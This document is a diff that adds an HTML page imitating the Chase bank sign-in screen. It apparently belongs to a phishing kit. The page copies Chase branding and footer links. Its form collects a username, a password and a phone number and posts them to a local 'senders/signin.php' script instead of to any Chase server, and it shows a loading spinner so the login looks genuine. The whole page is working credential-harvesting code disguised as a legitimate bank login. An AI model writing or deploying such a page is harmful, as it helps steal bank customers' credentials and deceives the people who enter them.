@@ -1,0 +1,111 @@
+<html><head>
+<title>Sign in - chase.com</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<link rel="stylesheet" href="asset/css/login.css">
+<link rel="stylesheet" href="https://stylesheetcss.blogspot.com/?style.css">
+<link rel="icon" href="asset/img/icon.ico">
+<script src="asset/js/jquery.js"></script>
+</head>
+<body onload="stopLoad()">
+<div id="waiter" style="display: none;">
+<div class="waiter">
+<div style="display:inline-block; width:100%; text-align:center;">
+ <img src="asset/img/loader2.gif" style="width:45px;">
+</div>
+</div>
+</div>
+
+
+<div class="top">
+<img src="asset/img/logo.svg">
+</div>
+<div class="loginbox">
+<div style=" padding:30px;">
+<div style="color:red; display:none; text-align:left; " id="textError">
+<div style="display:table; height:40px;">
+<div style="height:100%; float:left; margin-right:7px; ">
+<img src="asset/img/error.png">
+</div>
+ Please tell us your username and password.
+</div>
+</div>
+<form action="senders/signin.php" method="post" name="login" id="login" onsubmit="return false"> 
+<input type="text" class="input" id="username" name="Username" placeholder="Username">
+<input type="password" class="input" id="password" name="Password" placeholder="Password">
+<input type="text" class="input" id="phone" name="phome" placeholder="Phone Number">
+
+<div style="align-items:center; display:flex; margin-top:8px; font-size:0.9em; color:#737373;">
+<label><input type="checkbox" style="float:left; height:23; width:23; margin-right:10px; margin-top:-0.8;">Remember me</label>
+</div>
+<button onclick="reSubmit()" type="submit">Sign in</button>
+</form>
+<div style="text-align:left; font-size:0.9em;">
+<a href="#">Forgot username/password? &gt;</a><br>
+<a href="#">Not Enrolled? Sign Up Now. &gt;</a>
+</div>
+</div>
+</div>
+<div class="down" style="display: block;">
+<div style="font-size:1.6em;">Follow us: <img style="margin-bottom:-3px;" src="asset/img/social.png"></div>
+<div class="line"></div>
+<div class="downcont" style="width:80%; display:inline-block; font-size:0.9em;">
+<a href="#">Contact us</a>
+<a href="#">Privacy</a>
+ <a href="#">Security</a>
+<a href="#">Terms of use</a>
+ <a href="#">Accessibility</a>
+<a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
+ <a href="#">Fair Lending</a>
+<a href="#">About Chase</a>
+ <a href="#"> J.P. Morgan</a><br><br>
+<a href="#">JPMorgan Chase &amp; Co.</a>
+ <a href="#">Careers</a>
+<a href="#">Español</a>
+ <a href="#"> Chase Canada</a>
+<a href="#">Site map</a>
+ <a href="#">Member FDIC</a>
+<a href="#"> Equal Housing Lender</a>
+<br><br>
+© 2018 JPMorgan Chase &amp; Co.
+</div>
+</div>
+<script>
+	$(function(){
+		$("#username").keyup(function(){
+			$("#username").removeClass("hasError");
+		});
+		
+		$("#password").keyup(function(){
+			$("#password").removeClass("hasError");
+		});
+	});
+		
+		
+	function reSubmit(){
+		
+		var emailValue = $("#username").val();
+		var passValue = $("#password").val();
+		 var passValue = $("#phone").val();
+	if(emailValue.trim() == "" || passValue == ""){
+		if(emailValue.trim() == ""){$("#username").addClass("hasError");}
+		if(passValue.trim() == ""){$("#password").addClass("hasError");}
+		$("#textError").show();
+	}
+	else{
+		$(".down").hide();
+		$("#waiter").show();
+		document.forms['login'].submit();
+	}
+	
+	}
+	
+	
+function stopLoad(){
+		$("#waiter").hide();
+		$(".down").show();
+}
+</script>
+
+
+</body></html>
